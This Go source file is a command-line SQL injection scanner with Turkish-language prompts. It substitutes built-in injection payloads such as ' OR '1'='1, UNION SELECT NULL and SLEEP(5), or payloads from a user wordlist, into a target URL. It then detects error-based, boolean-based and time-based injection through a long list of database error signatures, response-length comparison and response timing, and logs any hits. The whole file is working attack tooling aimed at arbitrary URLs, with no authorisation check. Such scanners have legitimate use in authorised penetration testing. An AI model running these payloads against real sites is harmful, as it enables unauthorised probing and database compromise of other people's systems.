package main

import (
	"bufio"
	"fmt"
	"io/ioutil"
	"net/http"
	"net/url"
	"os"
	"strings"
	"time"
)

var client = &http.Client{
	Timeout: 15 * time.Second,
}

func sqli() {
	bufio.NewReader(os.Stdin).ReadString('\n')
	reader := bufio.NewReader(os.Stdin)

	fmt.Print("FUZZ içeren hedef URL'yi girin (örnek: http://site.com/page?id=FUZZ): ")
	rawURL, _ := reader.ReadString('\n')
	rawURL = strings.TrimSpace(rawURL)

	if !strings.Contains(rawURL, "FUZZ") {
		fmt.Println("Hata: URL içinde 'FUZZ' bulunmalı.")
		return
	}

	fmt.Print("Wordlist dosyasının yolunu girin (boş geçersen varsayılan kullanılacak): ")
	wordlistPath, _ := reader.ReadString('\n')
	wordlistPath = strings.TrimSpace(wordlistPath)

	var payloads []string
	if wordlistPath == "" {
		payloads = []string{
			"'",
			"\"",
			"' OR '1'='1",
			"' AND 1=1--",
			"' AND 1=2--",
			"' UNION SELECT NULL--",
			"' UNION SELECT NULL,NULL--",
			"' OR SLEEP(5)--",
			"' AND SLEEP(5)-- ",
		}
	} else {
		file, err := os.Open(wordlistPath)
		if err != nil {
			fmt.Println("Wordlist açılamadı:", err)
			return
		}
		defer file.Close()

		scanner := bufio.NewScanner(file)
		for scanner.Scan() {
			payload := strings.TrimSpace(scanner.Text())
			if payload != "" {
				payloads = append(payloads, payload)
			}
		}
	}

	for _, payload := range payloads {
		encoded := url.QueryEscape(payload)
		finalURL := strings.Replace(rawURL, "FUZZ", encoded, -1)
		testSQLi(finalURL, payload)
	}
}

func testSQLi(testURL, payload string) {
	start := time.Now()
	resp, err := client.Get(testURL)
	elapsed := time.Since(start)

	if err != nil {
		fmt.Println("[!] Hata:", err)
		return
	}
	defer resp.Body.Close()

	body, _ := ioutil.ReadAll(resp.Body)
	content := string(body)

	errorSignatures := []string{
		"SQL syntax",
		"mysql_fetch",
		"You have an error in your SQL syntax",
		"Warning: mysql_",
		"Warning: mysqli_",
		"Unknown column",
		"Query failed",
		"supplied argument is not a valid MySQL result resource",
		"pg_query(): Query failed",
		"pg_fetch",
		"PostgreSQL query failed",
		"Warning: pg_",
		"unterminated quoted string",
		"invalid input syntax for",
		"pg_exec",
		"Unclosed quotation mark",
		"Microsoft OLE DB Provider for SQL Server",
		"ODBC SQL Server Driver",
		"SQL Server Native Client",
		"Incorrect syntax near",
		"Warning: mssql_",
		"System.Data.SqlClient.SqlException",
		"ORA-",
		"Warning: oci_",
		"Oracle error",
		"PLS-",
		"ORA-00933",
		"ORA-00936",
		"ORA-01756",
		"SQLite/JDBCDriver",
		"Warning: sqlite_",
		"Warning: SQLite3::",
		"unrecognized token:",
		"SQLite3::query(): Unable to prepare statement",
		"CLI Driver",
		"DB2 SQL error:",
		"SQLCODE",
		"SQLSTATE",
		"syntax error",
		"unexpected end of SQL command",
		"Warning: odbc_",
		"ODBC",
		"java.sql.SQLException",
		"Fatal error",
		"JET Database",
		"VBScript Runtime",
		"Microsoft JET Database Engine error",
		"Invalid SQL statement",
		"SQLException",
	}

	for _, sig := range errorSignatures {
		if strings.Contains(content, sig) {
			fmt.Printf("[!] Error-Based SQLi Bulundu: %s | Payload: %s\n", testURL, payload)
			logSQLiResultToFile(testURL, payload, "Error-Based")
			return
		}
	}

	if strings.Contains(payload, "1=1") {
		testFalse := strings.Replace(testURL, url.QueryEscape("1=1"), url.QueryEscape("1=2"), -1)
		respFalse, err := client.Get(testFalse)
		if err == nil {
			defer respFalse.Body.Close()
			bodyFalse, _ := ioutil.ReadAll(respFalse.Body)
			if len(body) != len(bodyFalse) {
				fmt.Printf("[!] Boolean-Based SQLi Bulundu: %s | Payload: %s\n", testURL, payload)
				logSQLiResultToFile(testURL, payload, "Boolean-Based")
				return
			}
		}
	}

	
	if strings.Contains(strings.ToUpper(payload), "SLEEP(") || strings.Contains(strings.ToUpper(payload), "WAITFOR DELAY") {
		if elapsed >= 4*time.Second {
			fmt.Printf("[!] Time-Based SQLi Bulundu: %s | Payload: %s | Süre: %.2fs\n", testURL, payload, elapsed.Seconds())
			logSQLiResultToFile(testURL, payload, "Time-Based")
			return
		}
	}

	fmt.Printf("[ ] Güvenli: %s | Süre: %.2fs\n", testURL, elapsed.Seconds())
}

func logSQLiResultToFile(url, payload, sqliType string) {
	dir := "ScanResults"
	filePath := dir + "/sqli_results.txt"

	if _, err := os.Stat(dir); os.IsNotExist(err) {
		err = os.Mkdir(dir, 0755)
		if err != nil {
			fmt.Println("Klasör oluşturulamadı:", err)
			return
		}
	}

	file, err := os.OpenFile(filePath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		fmt.Println("Log dosyasına yazılamadı:", err)
		return
	}
	defer file.Close()

	entry := fmt.Sprintf("[%s] %s | Payload: %s\n", sqliType, url, payload)
	file.WriteString(entry)
}
